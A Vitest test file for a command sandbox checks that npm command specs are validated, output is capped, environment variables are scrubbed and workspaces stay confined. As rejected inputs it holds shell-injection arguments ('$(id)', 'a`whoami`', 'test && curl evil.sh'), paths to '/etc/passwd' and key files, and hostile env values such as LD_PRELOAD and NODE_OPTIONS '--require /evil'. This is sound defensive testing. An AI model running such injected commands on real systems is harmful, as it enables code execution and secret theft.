import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  MAX_CAPTURED_OUTPUT_BYTES,
  assertSafeCommandSpec,
  buildResult,
  createOutputCollector,
  DisabledCommandRunner,
  DockerSandboxRunner,
  ProcessSandboxRunner,
  resolveNpmCommand,
  sanitizeSpecEnv,
  toCommandRunResult,
  toShellCommandLine,
} from '@acr/sandbox';
import {
  SandboxError,
  ValidationError,
  noopLogger,
  type CommandSpec,
} from '@acr/shared';

function makeSpec(overrides: Partial<CommandSpec> = {}): CommandSpec {
  return {
    kind: 'test',
    script: 'test',
    args: [],
    workspaceDir: '/work/repo',
    timeoutMs: 60_000,
    image: 'node:22-bookworm-slim',
    network: 'none',
    memoryLimit: '1g',
    cpuLimit: 1,
    pidsLimit: 256,
    ...overrides,
  };
}

function expectValidationError(fn: () => unknown): ValidationError {
  let caught: unknown;
  try {
    fn();
  } catch (error) {
    caught = error;
  }
  if (caught instanceof ValidationError) {
    return caught;
  }
  throw new Error(
    `expected ValidationError, got ${caught === undefined ? 'nothing (no throw)' : String(caught)}`,
  );
}

describe('assertSafeCommandSpec — accepted commands', () => {
  it('accepts the realistic `npm test -- --runInBand` shape', () => {
    expect(() =>
      assertSafeCommandSpec(makeSpec({ script: 'test', args: ['--runInBand'] })),
    ).not.toThrow();
  });

  it('accepts flags with `=`, `/`, `.` and `:` (legitimate npm/vitest flags)', () => {
    expect(() =>
      assertSafeCommandSpec(
        makeSpec({
          args: ['--filter=packages/core', '--maxWorkers=2', '--reporter=./config/reporter.js', '-u'],
        }),
      ),
    ).not.toThrow();
  });

  it('accepts the minimum timeout boundary of 1000ms', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ timeoutMs: 1_000 }))).not.toThrow();
  });

  it('accepts a 200-character argument (pattern upper bound)', () => {
    expect(() =>
      assertSafeCommandSpec(makeSpec({ args: ['a'.repeat(200)] })),
    ).not.toThrow();
  });
});

describe('assertSafeCommandSpec — shell metacharacters are rejected', () => {
  const METACHAR_ARGS = [
    '&&',
    'a&&b',
    'test&&rm',
    ';',
    'a;b',
    '|',
    'a|b',
    'a`whoami`',
    '$(id)',
    'a$(echo hi)b',
    '>',
    '>out.txt',
    'a>b',
    '<',
    '&',
    '"quoted"',
    "'single'",
    'a b',
    '$HOME',
    'a\nb',
  ];

  for (const argument of METACHAR_ARGS) {
    it(`rejects argument ${JSON.stringify(argument)}`, () => {
      const error = expectValidationError(() =>
        assertSafeCommandSpec(makeSpec({ args: [argument] })),
      );
      expect(error.code).toBe('validation_error');
      expect(error.message).toBe('Unsafe command argument');
      expect(error.details).toEqual({ argument });
    });
  }

  it('rejects shell metacharacters inside the script name', () => {
    const error = expectValidationError(() =>
      assertSafeCommandSpec(makeSpec({ script: 'test && curl evil.sh' })),
    );
    expect(error.message).toBe('Unsafe package script name');
    expect(error.details).toEqual({ script: 'test && curl evil.sh' });
  });

  it('rejects a script name that does not start with an alphanumeric character', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ script: '-install' }))).toThrow(ValidationError);
    expect(() => assertSafeCommandSpec(makeSpec({ script: ':evil' }))).toThrow(ValidationError);
    expect(() => assertSafeCommandSpec(makeSpec({ script: '_x' }))).toThrow(ValidationError);
  });

  it('rejects empty and oversized script names', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ script: '' }))).toThrow(ValidationError);
    expect(() => assertSafeCommandSpec(makeSpec({ script: 'a'.repeat(65) }))).toThrow(
      ValidationError,
    );
  });
});

describe('assertSafeCommandSpec — path escapes are rejected', () => {
  it('rejects `..` traversal anywhere in the argument', () => {
    for (const argument of ['..', '../secrets', 'src/../.env', '--config=../env', 'a..b']) {
      expect(() => assertSafeCommandSpec(makeSpec({ args: [argument] }))).toThrow(ValidationError);
    }
  });

  it('rejects absolute POSIX paths', () => {
    for (const argument of ['/etc/passwd', '--out=/tmp/evil', '/']) {
      expect(() => assertSafeCommandSpec(makeSpec({ args: [argument] }))).toThrow(ValidationError);
    }
  });

  it('rejects absolute Windows paths and drive-anchored flag values', () => {
    for (const argument of ['C:/Windows/win.ini', '--file=D:/secrets/key.pem']) {
      expect(() => assertSafeCommandSpec(makeSpec({ args: [argument] }))).toThrow(ValidationError);
    }
  });

  it('accepts relative paths that stay inside the workspace', () => {
    expect(() =>
      assertSafeCommandSpec(makeSpec({ args: ['src/index.ts', '--out=dist/report.json'] })),
    ).not.toThrow();
  });
});

describe('assertSafeCommandSpec — empty and whitespace arguments are rejected', () => {
  it('rejects the empty string argument', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ args: [''] }))).toThrow(ValidationError);
  });

  it.each([' ', '\t', '   ', 'a \tb'])('rejects whitespace-bearing argument %j', (argument) => {
    expect(() => assertSafeCommandSpec(makeSpec({ args: [argument] }))).toThrow(ValidationError);
  });

  it('rejects an argument over 200 characters', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ args: ['a'.repeat(201)] }))).toThrow(
      ValidationError,
    );
  });
});

describe('assertSafeCommandSpec — non-string entries are rejected at runtime', () => {
  // These values cannot be typed as `string` without a cast: they only reach
  // the validator through untyped JSON (model output / queue payload drift).
  const HOSTILE_NON_STRINGS: readonly unknown[] = [42, true, false, null, undefined, {}, [], 3.5];

  for (const value of HOSTILE_NON_STRINGS) {
    it(`rejects non-string argument ${JSON.stringify(value) ?? String(value)}`, () => {
      const error = expectValidationError(() =>
        assertSafeCommandSpec(makeSpec({ args: [value as string] })),
      );
      expect(error.details).toEqual({ argument: value });
    });
  }

  it('rejects a non-string script name', () => {
    const error = expectValidationError(() =>
      assertSafeCommandSpec(makeSpec({ script: 42 as unknown as string })),
    );
    expect(error.details).toEqual({ script: 42 });
  });

  it('rejects non-numeric and non-finite timeout values', () => {
    const badTimeouts: readonly unknown[] = ['5000', Number.NaN, Number.POSITIVE_INFINITY, null];
    for (const timeoutMs of badTimeouts) {
      expect(() =>
        assertSafeCommandSpec(makeSpec({ timeoutMs: timeoutMs as number })),
      ).toThrow(ValidationError);
    }
  });

  it('rejects a timeout below the 1000ms floor', () => {
    expect(() => assertSafeCommandSpec(makeSpec({ timeoutMs: 999 }))).toThrow(ValidationError);
    expect(() => assertSafeCommandSpec(makeSpec({ timeoutMs: 0 }))).toThrow(ValidationError);
    expect(() => assertSafeCommandSpec(makeSpec({ timeoutMs: -1 }))).toThrow(ValidationError);
  });
});

describe('assertSafeCommandSpec — env is not part of command safety', () => {
  it('accepts a spec with an oversized env map (scrubbing is the runner layer)', () => {
    const env: Record<string, string> = {};
    for (let index = 0; index < 2_000; index += 1) {
      env[`CI_VAR_${index}`] = `value-${index}`;
    }
    env['PATH_INJECTION'] = '/evil/bin:$PATH';
    const spec = makeSpec({ env });
    expect(() => assertSafeCommandSpec(spec)).not.toThrow();
    const resolved = resolveNpmCommand(spec, 'linux');
    // The resolved argv must not leak any env content: env reaches the child
    // only through runner-level plumbing (integration-covered).
    for (const item of [resolved.binary, ...resolved.args]) {
      expect(item).not.toContain('value-1999');
    }
  });
});

describe('resolveNpmCommand — assembly', () => {
  it('builds a plain `npm run <script>` on POSIX with no args', () => {
    const resolved = resolveNpmCommand(makeSpec({ script: 'build' }), 'linux');
    expect(resolved.binary).toBe('npm');
    expect(resolved.args).toEqual(['run', 'build']);
    expect(resolved.display).toBe('npm run build');
  });

  it('inserts the `--` passthrough separator on POSIX when args exist', () => {
    const resolved = resolveNpmCommand(makeSpec({ script: 'test', args: ['--runInBand'] }), 'linux');
    expect(resolved.binary).toBe('npm');
    expect(resolved.args).toEqual(['run', 'test', '--', '--runInBand']);
    expect(resolved.display).toBe('npm run test -- --runInBand');
  });

  it('wraps through cmd.exe on win32 with /d /s /c and keeps display readable', () => {
    const resolved = resolveNpmCommand(makeSpec({ script: 'test', args: ['--runInBand'] }), 'win32');
    expect(resolved.binary).toBe(process.env['ComSpec'] ?? 'cmd.exe');
    expect(resolved.args[0]).toBe('/d');
    expect(resolved.args[1]).toBe('/s');
    expect(resolved.args[2]).toBe('/c');
    expect(resolved.args[3]).toBe('npm run test -- --runInBand');
    expect(resolved.args).toHaveLength(4);
    expect(resolved.display).toBe('npm run test -- --runInBand');
  });

  it('omits the separator from the display when args are empty', () => {
    const resolved = resolveNpmCommand(makeSpec({ script: 'lint', args: [] }), 'linux');
    expect(resolved.display).toBe('npm run lint');
  });
});

describe('rejected specs never produce an executable command', () => {
  const REJECTED_SPECS: readonly CommandSpec[] = [
    makeSpec({ args: ['a&&b'] }),
    makeSpec({ args: ['--out=/etc/passwd'] }),
    makeSpec({ args: ['../env'] }),
    makeSpec({ args: [''] }),
    makeSpec({ args: [null as unknown as string] }),
    makeSpec({ script: '' }),
    makeSpec({ timeoutMs: 999 }),
  ];

  for (const [index, spec] of REJECTED_SPECS.entries()) {
    it(`spec #${index}: resolveNpmCommand throws on both platforms and toShellCommandLine refuses`, () => {
      expect(() => resolveNpmCommand(spec, 'linux')).toThrow(ValidationError);
      expect(() => resolveNpmCommand(spec, 'win32')).toThrow(ValidationError);
      expect(() => toShellCommandLine(spec)).toThrow(ValidationError);
    });
  }
});

describe('toShellCommandLine', () => {
  it('renders the joined command line for accepted specs', () => {
    expect(toShellCommandLine(makeSpec({ script: 'test', args: ['--runInBand', '-u'] }))).toBe(
      'npm run test -- --runInBand -u',
    );
    expect(toShellCommandLine(makeSpec({ script: 'build', args: [] }))).toBe('npm run build');
  });
});

describe('createOutputCollector — bounded capture', () => {
  it('exposes the documented default cap', () => {
    expect(MAX_CAPTURED_OUTPUT_BYTES).toBe(512 * 1024);
  });

  it('truncates a chunk larger than the cap, marks truncation, and keeps the prefix', () => {
    const limit = 8;
    const collector = createOutputCollector(limit);
    collector.append(Buffer.from('abcdefghij', 'utf8'));

    expect(collector.byteLength()).toBe(limit);
    const text = collector.toString();
    expect(text).toBe('abcdefgh\n...[output truncated at 8 bytes]');
    expect(text.startsWith('abcdefgh')).toBe(true);
    expect(Buffer.byteLength(text.split('\n')[0] ?? '', 'utf8')).toBeLessThanOrEqual(limit);
  });

  it('caps a stream over the default limit and preserves the first bytes verbatim', () => {
    const collector = createOutputCollector();
    const flood = Buffer.alloc(MAX_CAPTURED_OUTPUT_BYTES + 4_096, 0x61);
    collector.append(flood);

    expect(collector.byteLength()).toBe(MAX_CAPTURED_OUTPUT_BYTES);
    const text = collector.toString();
    expect(text.endsWith(`\n...[output truncated at ${MAX_CAPTURED_OUTPUT_BYTES} bytes]`)).toBe(
      true,
    );
    const body = text.slice(0, text.lastIndexOf('\n...[output truncated'));
    expect(body.length).toBe(MAX_CAPTURED_OUTPUT_BYTES);
  });

  it('accumulates multiple chunks until the cap, then freezes byte growth', () => {
    const collector = createOutputCollector(10);
    collector.append(Buffer.from('12345', 'utf8'));
    expect(collector.toString()).toBe('12345');
    collector.append(Buffer.from('67890', 'utf8'));
    // Exactly at the cap: still not truncated.
    expect(collector.byteLength()).toBe(10);
    expect(collector.toString()).toBe('1234567890');
    collector.append(Buffer.from('X', 'utf8'));
    expect(collector.byteLength()).toBe(10);
    expect(collector.toString()).toBe('1234567890\n...[output truncated at 10 bytes]');
    collector.append(Buffer.from('more and more', 'utf8'));
    expect(collector.byteLength()).toBe(10);
  });

  it('produces an empty string for an unused collector', () => {
    const collector = createOutputCollector(10);
    expect(collector.toString()).toBe('');
    expect(collector.byteLength()).toBe(0);
  });
});

describe('buildResult — status mapping', () => {
  function collectors(): {
    stdout: ReturnType<typeof createOutputCollector>;
    stderr: ReturnType<typeof createOutputCollector>;
  } {
    return { stdout: createOutputCollector(100), stderr: createOutputCollector(100) };
  }

  it('maps exit code 0 to succeeded', () => {
    const result = buildResult({ exitCode: 0, timedOut: false, durationMs: 5, ...collectors() });
    expect(result.status).toBe('succeeded');
    expect(result.failureReason).toBeNull();
    expect(result.timedOut).toBe(false);
  });

  it('maps a non-zero exit code to failed', () => {
    const result = buildResult({ exitCode: 2, timedOut: false, durationMs: 5, ...collectors() });
    expect(result.status).toBe('failed');
    expect(result.exitCode).toBe(2);
  });

  it('maps a timeout to timed_out even with exit code 0', () => {
    const result = buildResult({ exitCode: 0, timedOut: true, durationMs: 5, ...collectors() });
    expect(result.status).toBe('timed_out');
  });

  it('maps a null exit code (signal kill) to failed', () => {
    const result = buildResult({ exitCode: null, timedOut: false, durationMs: 5, ...collectors() });
    expect(result.status).toBe('failed');
    expect(result.exitCode).toBeNull();
  });

  it('passes through a failure reason and rendered output', () => {
    const { stdout, stderr } = collectors();
    stdout.append(Buffer.from('out', 'utf8'));
    stderr.append(Buffer.from('err', 'utf8'));
    const result = buildResult({
      exitCode: 1,
      timedOut: false,
      durationMs: 9,
      failureReason: 'spawn EACCES',
      stdout,
      stderr,
    });
    expect(result.stdout).toBe('out');
    expect(result.stderr).toBe('err');
    expect(result.failureReason).toBe('spawn EACCES');
  });
});

describe('sanitizeSpecEnv', () => {
  it('keeps ordinary extra variables', () => {
    expect(sanitizeSpecEnv({ FOO: 'bar', CI_JOB_ID: '42' })).toEqual({ FOO: 'bar', CI_JOB_ID: '42' });
  });

  it('drops protected keys the sandbox owns', () => {
    expect(
      sanitizeSpecEnv({
        PATH: '/evil',
        HOME: '/evil',
        NODE_OPTIONS: '--require /evil',
        DOCKER_HOST: 'tcp://evil:2375',
        FOO: 'kept',
      }),
    ).toEqual({ FOO: 'kept' });
  });

  it('drops GIT_/NPM_CONFIG_/LD_ prefixes and malformed keys', () => {
    expect(
      sanitizeSpecEnv({
        GIT_SSH_COMMAND: 'evil',
        NPM_CONFIG_REGISTRY: 'evil',
        LD_PRELOAD: 'evil',
        'lowercase': 'evil',
        'HAS SPACE': 'evil',
        '': 'evil',
      }),
    ).toEqual({});
  });

  it('handles undefined as no extras', () => {
    expect(sanitizeSpecEnv(undefined)).toEqual({});
  });
});

describe('sandbox workspace confinement', () => {
  const root = join(tmpdir(), `acr-test-root-${process.pid}`);

  function dockerRunner() {
    return new DockerSandboxRunner({
      logger: noopLogger,
      dockerBinary: 'docker',
      defaultImage: 'node:22-bookworm-slim',
      timeoutMs: 60_000,
      cpuLimit: 1,
      memoryLimit: '1g',
      pidsLimit: 256,
      network: 'none',
      allowedRoots: [root],
    });
  }

  function processRunner() {
    return new ProcessSandboxRunner({ logger: noopLogger, timeoutMs: 60_000, allowedRoots: [root] });
  }

  it.each([['docker', dockerRunner], ['process', processRunner]] as const)(
    '%s runner rejects a sibling directory sharing the root prefix',
    async (_kind, build) => {
      const spec = makeSpec({ workspaceDir: `${root}-evil` });
      await expect(build().run(spec)).rejects.toBeInstanceOf(SandboxError);
    },
  );

  it.each([['docker', dockerRunner], ['process', processRunner]] as const)(
    '%s runner rejects `..` traversal out of the root',
    async (_kind, build) => {
      const spec = makeSpec({ workspaceDir: join(root, '..', 'etc') });
      await expect(build().run(spec)).rejects.toBeInstanceOf(SandboxError);
    },
  );

  it('disabled runner fails closed instead of executing', async () => {
    // DisabledCommandRunner.run() takes no spec by design: in SANDBOX_MODE=off
    // nothing may execute anywhere, so there is no command to describe.
    await expect(new DisabledCommandRunner().run()).rejects.toBeInstanceOf(SandboxError);
  });
});

describe('toCommandRunResult', () => {
  it('merges the structured result with spec metadata and the display command', () => {
    const spec = makeSpec({ image: 'node:22-alpine' });
    const runResult = toCommandRunResult(
      {
        status: 'succeeded',
        exitCode: 0,
        stdout: 'ok',
        stderr: '',
        durationMs: 12,
        timedOut: false,
        failureReason: null,
      },
      spec,
      'process',
      'npm run test',
    );
    expect(runResult).toEqual({
      status: 'succeeded',
      exitCode: 0,
      stdout: 'ok',
      stderr: '',
      durationMs: 12,
      timedOut: false,
      sandbox: 'process',
      image: 'node:22-alpine',
      command: 'npm run test',
    });
  });
});
